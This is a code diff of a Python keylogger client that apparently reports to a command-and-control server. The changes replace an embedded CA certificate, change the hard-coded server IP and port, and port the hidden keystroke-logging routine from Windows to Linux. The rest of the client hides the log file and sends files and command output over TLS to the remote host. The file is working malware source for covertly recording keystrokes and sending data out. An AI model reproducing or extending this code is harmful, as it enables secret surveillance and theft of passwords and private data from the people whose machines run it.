@@ -9,36 +9,37 @@ import subprocess
 
 CA_CERTIFICATE = """
 -----BEGIN CERTIFICATE-----
-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
+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
 -----END CERTIFICATE-----
+
 """
 
 def save_command_result(output_file):
@@ -89,9 +90,12 @@ def send_file(conn, filename):
             conn.sendall(chunk)
 
 
-def key_logger(hidden_file_path, client_ssl):
+def key_logger(hidden_file_path, client_ssl, os_local):
     logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")
-    os.system(f"attrib +h {hidden_file_path}")
+    if os_local == 'windows':
+        os.system(f"attrib +h {hidden_file_path}")
+    elif os_local == 'linux':
+        hidden_file_path = '.' + hidden_file_path
 
     def on_press(key):
         logging.info(str(key))
@@ -105,7 +109,6 @@ def key_logger(hidden_file_path, client_ssl):
         logging.shutdown()
         delete_hidden_file(hidden_file_path)
         exit(1)
-
 
 def listen_to_server(client_ssl):
     while True:
@@ -129,28 +132,25 @@ def timeout_handler(client_ssl):
 
 def main():
     os_local = os_check()
-    if os_local == 'Windows':
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        context.load_verify_locations(cadata=CA_CERTIFICATE)
-        host = '10.56.182.51'  # Replace with the server IP
-        port = 90
-        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
-        client_ssl.connect((host, port))
-        print("Client ON")
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.load_verify_locations(cadata=CA_CERTIFICATE)
+    host = '10.49.123.115'  # Replace with the server IP
+    port = 10
+    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
+    client_ssl.connect((host, port))
+    print("Client ON")
 
-        while True:
-            try:
-                key_logger("its_a_trap.txt", client_ssl)
+    while True:
+        try:
+            key_logger("its_a_trap.txt", client_ssl,os_local)
 
-            except Exception as e:
-                print(f"Error: {e}")
-                break
+        except Exception as e:
+            print(f"Error: {e}")
+            break
 
         print("-- END --")
         client_ssl.close()
-    else:
-        print("Linux in maintenance")
 
 
 if __name__ == "__main__":
